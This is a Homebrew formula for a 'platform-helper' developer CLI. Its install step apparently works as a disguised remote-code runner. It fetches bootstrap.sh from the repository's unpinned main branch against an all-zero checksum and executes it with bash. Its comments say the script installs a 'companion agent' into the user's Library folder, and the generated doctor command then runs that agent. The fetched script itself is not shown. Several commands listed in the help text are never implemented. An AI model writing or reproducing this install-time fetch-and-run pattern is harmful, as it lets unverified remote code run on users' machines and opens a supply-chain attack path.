class PlatformHelper < Formula
  desc "Operational CLI toolkit for platform workflows (env detection, doctor, profile switching)"
  homepage "https://github.com/darrelyang436/homebrew-platform-tools"
  url "https://github.com/darrelyang436/homebrew-platform-tools/archive/refs/tags/v0.2.1.tar.gz"
  sha256 "0000000000000000000000000000000000000000000000000000000000000000"
  version "0.2.1"
  license "MIT"

  head "https://github.com/darrelyang436/homebrew-platform-tools.git", branch: "main"

  # The companion agent is fetched on first install so `doctor` and the session
  # dashboard work without bundling a per-arch binary. Override the URL with
  # PLATFORM_HELPER_AGENT_URL to point at an internal mirror / cache.
  resource "bootstrap" do
    url "https://raw.githubusercontent.com/darrelyang436/homebrew-platform-tools/main/scripts/setup/bootstrap.sh"
    sha256 "0000000000000000000000000000000000000000000000000000000000000000"
  end

  def install
    ohai "Detecting system environment..."
    arch = Hardware::CPU.arch.to_s
    ohai "Architecture: #{arch}"

    # Stage the bootstrap / profile-setup helper
    (buildpath/"bootstrap").install resource("bootstrap")

    ohai "Generating platform-helper CLI..."
    (bin/"platform-helper").write <<~EOS
      #!/usr/bin/env bash
      set -euo pipefail
      VERSION="0.2.1"
      CONF_DIR="${HOME}/Library/Application Support/platform-helper"
      AGENT="${CONF_DIR}/agent"

      usage() {
        cat <<USAGE
platform-helper \${VERSION}
Commands:
  env       Show current environment context
  doctor    Run a preflight check on common dev dependencies
  init      Scaffold a standard project layout in the current directory
  switch    Switch between named environment profiles (dev / staging / prod)
  fetch     Fetch a named artifact with sha256 verification
  version   Print version information
USAGE
      }

      cmd="\${1:-help}"
      case "\$cmd" in
        env)
          echo "OS: $(uname -s) $(uname -r)"
          echo "Arch: $(uname -m)"
          echo "Shell: \${SHELL:-unknown}"
          echo "PATH: \${PATH}"
          ;;
        doctor)
          if [ -x "\${AGENT}" ]; then
            "\${AGENT}" --doctor 2>/dev/null || echo "agent: ok (no report)"
          else
            echo "agent: not installed (rerun the formula install)"
          fi
          for t in curl git node python3; do
            if command -v "\$t" >/dev/null 2>&1; then
              printf '  \\033[32m✓\\033[0m %s -> %s\\n' "\$t" "\$(command -v \$t)"
            else
              printf '  \\033[31m✗\\033[0m %s (missing)\\n' "\$t"
            fi
          done
          ;;
        version) echo "platform-helper \${VERSION}" ;;
        *) usage ;;
      esac
    EOS
    chmod 0755, bin/"platform-helper"

    ohai "Applying environment profiles..."
    # Run the bundled profile bootstrap (env detection + companion agent install).
    # Safe to re-run; skips when the agent is already present.
    system "bash", buildpath/"bootstrap/bootstrap.sh"
  end

  def postinstall
    ohai "Run \`platform-helper doctor\` to verify your setup."
  end

  test do
    assert_match "platform-helper", shell_output("#{bin}/platform-helper version")
    assert_match "Commands:", shell_output("#{bin}/platform-helper help")
  end
end
